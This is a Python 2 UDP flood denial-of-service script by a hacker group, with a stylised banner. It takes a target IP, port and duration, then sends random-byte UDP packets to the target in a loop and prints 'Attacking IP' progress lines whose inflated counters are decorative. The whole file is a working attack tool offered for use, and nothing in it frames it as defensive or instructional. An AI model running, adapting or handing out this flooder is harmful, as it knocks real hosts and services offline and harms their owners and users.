###############################
#!/usr/bin/env python2        #
#Fl00d UDP DoS Hawk           #
#Authorized by r00t#d4nZ      #
#Coded r00t#d4nZ              #
#CR45H FIGHTER TEAM           #
###############################

import os
import sys
import time
import socket
import random
import threading

E  = '\033[0m'
R  = '\033[31m'
G  = '\033[32m'
Y  = '\033[01;33m'
B  = '\033[1;34m'
P  = '\033[35m'
C  = '\033[36m'
GR = '\033[37m'
T  = '\033[93m'
F  = '\033[1;91m'
K  = '\033[33m'

agent = []

agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")

agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")

agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")

agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")

data = '''

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-us,en;q=0.5

Accept-Encoding: gzip,deflate

Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7

Keep-Alive: 115

Connection: keep-alive'''


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			#bytes = str("GET / HTTP/1.1\nHost: "+ip+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')

			#s.sendto(bytes, (ip, port))	

			#s.send(bytes)

bytes = random._urandom(1024)

os.system("clear")


print F+'''
                                
 88       88 P8888b.   d88888b,   P8888b.    .d88b.  .d8888.
 88       88 88    Y8  88    88   88    Y8  .8P  Y8. 88'  YP
 88       88 88     88 88ooooo'   88     88 88    88 `8bo.    
 88       88 88     88 88         88     88 88    88   `Y8b.
 Y88b. .d88P 88    d8' 88         88    d8' `8b  d8' db   8D
  'Y88888P'  888888'   Y8         888888'    `Y88P'  `8888Y'
  
\033[0m[\033[31m!\033[0m] \033[1;33mUDP \033[1;31mFlood \033[1;33mDoS
\033[0m[\033[31m!\033[0m] \033[1;91mAuthorized By\033[1;33m r00t#d4nZ
\033[0m[\033[31m!\033[0m]\033[1;91m Coded By\033[1;33m r00t#d4nZ
\033[0m[\033[31m!\033[0m]\033[1;91m Team :\033[1;33m CR45H FIGHTER TEAM_C

 '''

print ""
ip = raw_input(F+'Target IP : '+E)
port = input(B+'Port : '+E)
duration = input(Y+'Time DoS : '+E)
timeout = time.time() + duration
sent = 0
dos1 = 0
dos2 = 0
dos3 = 0


try:
    while True:
	if time.time() > timeout:
		break
	else:
		pass
		
	sock.sendto(bytes,(ip, port))
	sent = sent + 1
	dos1 = dos1 + 20
	dos2 = dos2 + 30
	dos3 = dos3 + 40
	print K+"Attacking IP"+R+" %s \033[1;33mSent packets \033[31m%s|%s|%s|%s \033[1;33mthrought \033[1;34mport %s"%(ip, sent,dos1,dos2,dos3, port)
	
	if port == 65535:
                port=1
                
except KeyboardInterrupt:
    print " \033[1;31mStopped"
    print "\033[1;33m-------------------------------------------------------\033[0m"
    print P+"[!]",time.ctime(time.time()),G+"<--packet "+R+"sent!"+G+" succes!-->"
    print "\033[1;33m-------------------------------------------------------\033[0m"
    
    
    
   